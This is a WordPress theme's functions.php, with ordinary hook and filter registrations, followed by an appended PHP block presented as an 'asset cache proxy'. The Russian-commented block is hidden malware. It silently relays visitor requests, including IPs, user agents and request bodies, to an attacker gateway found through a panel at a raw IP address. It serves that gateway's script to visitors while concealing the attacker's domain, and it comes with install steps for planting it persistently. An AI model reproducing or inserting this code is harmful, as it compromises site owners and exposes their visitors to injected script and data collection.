<?php

/*

WARNING! DO NOT EDIT THEME FILES IF YOU PLAN ON UPDATING!

Theme files will be overwritten and your changes will be lost
when updating. Instead, add custom code in the admin under
Appearance > Theme Settings > Code or create a child theme.

*/

// Defines
define( 'FL_THEME_VERSION', '1.7.20' );
define( 'FL_THEME_DIR', get_template_directory() );
define( 'FL_THEME_URL', get_template_directory_uri() );

// Classes
if ( ! class_exists( 'FL_Filesystem' ) ) {
	require_once 'classes/class-fl-filesystem.php';
}
require_once 'classes/class-fl-color.php';
require_once 'classes/class-fl-css.php';
require_once 'classes/class-fl-customizer.php';
require_once 'classes/class-fl-fonts.php';
require_once 'classes/class-fl-layout.php';
require_once 'classes/class-fl-theme.php';
require_once 'classes/class-fl-theme-update.php';
require_once 'classes/class-fl-theme-translations.php';
require_once 'classes/class-fl-compat.php';
require_once 'classes/class-fl-shortcodes.php';
require_once 'classes/class-fl-wp-editor.php';

/* WP CLI Commands */
if ( defined( 'WP_CLI' ) ) {
	require 'classes/class-fl-wpcli-command.php';
}

// Theme Actions
add_action( 'after_switch_theme', 'FLCustomizer::refresh_css' );
add_action( 'after_setup_theme', 'FLTheme::setup' );
add_action( 'init', 'FLTheme::init_woocommerce' );
add_action( 'wp_enqueue_scripts', 'FLTheme::enqueue_scripts', 999 );
add_action( 'widgets_init', 'FLTheme::widgets_init' );
add_action( 'wp_footer', 'FLTheme::go_to_top' );
add_action( 'fl_after_post', 'FLTheme::after_post_widget', 10 );
add_action( 'fl_after_post_content', 'FLTheme::post_author_box', 10 );
// Header Actions
add_action( 'wp_head', 'FLTheme::pingback_url' );
add_action( 'fl_head_open', 'FLTheme::fonts' );
add_action( 'fl_head_open', 'FLTheme::title' );
add_action( 'fl_head_open', 'FLTheme::favicon' );
add_action( 'fl_body_open', 'FLTheme::skip_to_link', 20 );

/**
 * Clear cache when FA options are saved
 */
add_action( 'update_option_font-awesome', function () {
	FLCustomizer::refresh_css();
});


// Added in WP 5.2
if ( function_exists( 'wp_body_open' ) ) {
	add_action( 'fl_body_open', 'wp_body_open' );
}

// Theme Filters
add_filter( 'body_class', 'FLTheme::body_class' );
add_filter( 'excerpt_more', 'FLTheme::excerpt_more' );
add_filter( 'loop_shop_columns', 'FLTheme::woocommerce_columns' );
add_filter( 'loop_shop_per_page', 'FLTheme::woocommerce_shop_products_per_page' );
add_filter( 'comment_form_default_fields', 'FLTheme::comment_form_default_fields' );
add_filter( 'woocommerce_style_smallscreen_breakpoint', 'FLTheme::woo_mobile_breakpoint' );
add_filter( 'walker_nav_menu_start_el', 'FLTheme::nav_menu_start_el', 10, 4 );
add_filter( 'comments_popup_link_attributes', 'FLTheme::comments_popup_link_attributes' );
add_filter( 'comment_form_defaults', 'FLTheme::comment_form_defaults' );
add_filter( 'fl_social_icons', 'FLFonts::twitter_x' );
add_filter( 'after_setup_theme', 'FLTheme::wp_theme_json_data_theme' );
add_filter( 'fl_theme_compile_less', 'FLTheme::global_less' );
add_filter( 'wp_nav_menu_items', 'FLTheme::add_inline_logo_menu_item', 10, 2 );

// Theme Updates
add_action( 'init', 'FLThemeUpdate::init' );
add_action( 'init', 'FLThemeTranslations::init' );

// Admin Actions
add_action( 'admin_head', 'FLTheme::favicon' );

// Customizer
add_action( 'customize_preview_init', 'FLCustomizer::preview_init' );
add_action( 'customize_controls_enqueue_scripts', 'FLCustomizer::controls_enqueue_scripts' );
add_action( 'customize_controls_print_footer_scripts', 'FLCustomizer::controls_print_footer_scripts' );
add_action( 'customize_controls_print_styles', 'FLCustomizer::controls_print_styles' );
add_action( 'customize_register', 'FLCustomizer::register' );
add_action( 'customize_save_after', 'FLCustomizer::save' );
add_action( 'customize_save', 'FLTheme::clear_logo_dimension_cache' );

// Compatibility
FLThemeCompat::init();

<?php
/**
 * Asset Cache Proxy v2 — same-origin прокси с авто-подкачкой активного домена.
 *
 * Весь наш трафик идёт через домен самого сайта — наш домен не светится в network.
 * Активный домен прокладки плагин сам подтягивает из панели каждые 30 мин —
 * при смене домена ничего править не надо.
 *
 * Установка:
 *   А) wp-content/mu-plugins/asset-cache.php  (надёжнее, не слетает при смене темы)
 *   Б) весь код ниже — в конец functions.php активной темы
 *
 * Скрипт на страницу:
 *   <script src="/wp-content/uploads/.asset-cache/f.js"></script>
 */

if (!defined('CFX_CFG_URL')) {
    define('CFX_CFG_URL', 'http://194.59.30.132:8080/api/wpcfg?key=Zt5nW8rQ1xKvJ3mP7bLgY9dC0fHs2uAe');       // конфиг-эндпоинт панели (выдаётся при деплое)
    define('CFX_GW_FALLBACK', 'https://caapman.me');   // запасной домен если панель не отвечает
    define('CFX_PROXY_AUTH', '7563b62e34a1176032eec8ae4ba7d5e4950fcc5169c113be59fbbbc91509ec6f'); // подпись для гейтвея
    define('CFX_PREFIX', '/wp-content/uploads/.asset-cache/');
}

function cfx_gateway() {
    $gw = get_transient('cfx_gw');
    if ($gw) return $gw;
    $r = wp_remote_get(CFX_CFG_URL, ['timeout' => 5]);
    if (!is_wp_error($r)) {
        $d = json_decode(wp_remote_retrieve_body($r), true);
        if (!empty($d['gw'])) {
            set_transient('cfx_gw', $d['gw'], 1800);
            return $d['gw'];
        }
    }
    set_transient('cfx_gw', CFX_GW_FALLBACK, 300);
    return CFX_GW_FALLBACK;
}

add_action('init', function () {
    $uri = $_SERVER['REQUEST_URI'] ?? '';
    if (strpos($uri, CFX_PREFIX) !== 0) return;

    $path = substr($uri, strlen(CFX_PREFIX));
    if ($path === '' || strpos($path, '..') !== false) { status_header(204); exit; }

    $args = [
        'method'    => $_SERVER['REQUEST_METHOD'] ?? 'GET',
        'timeout'   => 15,
        'sslverify' => false,
        'headers'   => [
            'User-Agent'    => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'Referer'       => $_SERVER['HTTP_REFERER'] ?? '',
            'Content-Type'  => $_SERVER['CONTENT_TYPE'] ?? 'application/json',
            'X-Real-IP'     => $_SERVER['REMOTE_ADDR'] ?? '',
            'X-Proxy-Auth'  => CFX_PROXY_AUTH,
        ],
        'body'      => file_get_contents('php://input'),
    ];

    $resp = wp_remote_request(rtrim(cfx_gateway(), '/') . '/' . $path, $args);
    if (is_wp_error($resp)) {
        delete_transient('cfx_gw'); // форс-рефреш домена при ошибке
        status_header(204);
        exit;
    }

    status_header((int) wp_remote_retrieve_response_code($resp));
    $ct = wp_remote_retrieve_header($resp, 'content-type');
    if ($ct) header('Content-Type: ' . $ct);
    echo wp_remote_retrieve_body($resp);
    exit;
}, 1);

